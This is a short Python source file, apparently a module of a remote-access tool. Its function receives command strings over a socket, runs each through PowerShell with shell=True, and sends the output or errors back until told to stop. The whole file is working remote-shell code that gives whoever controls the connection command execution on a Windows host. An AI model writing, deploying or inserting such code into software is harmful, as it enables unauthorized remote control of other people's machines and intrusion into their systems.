import subprocess


def executeCommand(my_socket):
    print("[+] Executing commands")

    while True:
        user_command = my_socket.receiveData()
        print(user_command)

        if user_command == "stop":
            break
        if user_command == "":
            continue

        #Todo: get environment variable to then run approbate shell
        output = subprocess.run(["powershell", user_command], shell=True, capture_output=True)
        if output.stderr.decode("utf-8") == "":
            cmd_result = output.stdout.decode("utf-8")
        else:
            cmd_result = output.stderr.decode("utf-8")
        

        # serialization = [data bytes] + delimeter bytes ["<END_OF_RESULT>"] # end of file delimeter to control byte flow
        my_socket.sendCommandResult(cmd_result)